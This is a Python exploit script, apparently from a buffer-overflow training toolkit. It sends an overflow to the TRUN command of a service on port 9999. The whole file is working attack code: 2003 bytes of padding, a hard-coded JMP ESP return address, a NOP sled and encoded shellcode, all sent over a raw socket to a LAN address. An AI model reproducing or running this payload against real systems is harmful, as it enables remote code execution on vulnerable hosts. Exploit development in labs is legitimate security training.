#!/usr/bin/python3
#_*_ coding: utf8 _*_

import socket

"""
Project repository: https://github.com/JoshuaProvoste/Stack-Buffer-Overflow-Python-Toolkit 
"""

buf =  ""
buf += "\xbe\xa0\xe0\x3e\xbc\xd9\xc2\xd9\x74\x24\xf4\x5f\x33"
buf += "\xc9\xb1\x31\x31\x77\x13\x83\xef\xfc\x03\x77\xaf\x02"
buf += "\xcb\x40\x47\x40\x34\xb9\x97\x25\xbc\x5c\xa6\x65\xda"
buf += "\x15\x98\x55\xa8\x78\x14\x1d\xfc\x68\xaf\x53\x29\x9e"
buf += "\x18\xd9\x0f\x91\x99\x72\x73\xb0\x19\x89\xa0\x12\x20"
buf += "\x42\xb5\x53\x65\xbf\x34\x01\x3e\xcb\xeb\xb6\x4b\x81"
buf += "\x37\x3c\x07\x07\x30\xa1\xdf\x26\x11\x74\x54\x71\xb1"
buf += "\x76\xb9\x09\xf8\x60\xde\x34\xb2\x1b\x14\xc2\x45\xca"
buf += "\x65\x2b\xe9\x33\x4a\xde\xf3\x74\x6c\x01\x86\x8c\x8f"
buf += "\xbc\x91\x4a\xf2\x1a\x17\x49\x54\xe8\x8f\xb5\x65\x3d"
buf += "\x49\x3d\x69\x8a\x1d\x19\x6d\x0d\xf1\x11\x89\x86\xf4"
buf += "\xf5\x18\xdc\xd2\xd1\x41\x86\x7b\x43\x2f\x69\x83\x93"
buf += "\x90\xd6\x21\xdf\x3c\x02\x58\x82\x2a\xd5\xee\xb8\x18"
buf += "\xd5\xf0\xc2\x0c\xbe\xc1\x49\xc3\xb9\xdd\x9b\xa0\x26"
buf += "\x3c\x0e\xdc\xce\x99\xdb\x5d\x93\x19\x36\xa1\xaa\x99"
buf += "\xb3\x59\x49\x81\xb1\x5c\x15\x05\x29\x2c\x06\xe0\x4d"
buf += "\x83\x27\x21\x2e\x42\xb4\xa9\x9f\xe1\x3c\x4b\xe0"

xp = "192.168.0.5"
port = 9999

command = "TRUN"
junk = "/.:/"
A = "\x41" * 2003
jmp_esp = "\xAF\x11\x50\x62"
nops = "\x90" * 20

calc_payload = command + " " + junk + A + jmp_esp + nops + buf

try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((xp,port))
	sock.recv(1024)			
	sock.send(calc_payload)
except ConnectionRefusedError:
    print("Connection error. Review the IP address or port.")
    exit()
except socket.timeout:
    sock.close()
    print("\nConnection error. Timeout!")
except socket.error:
    sock.close()
    pass
except KeyboardInterrupt:
    sock.close()
    print("\n\nConnection closed. Bye!")
    exit()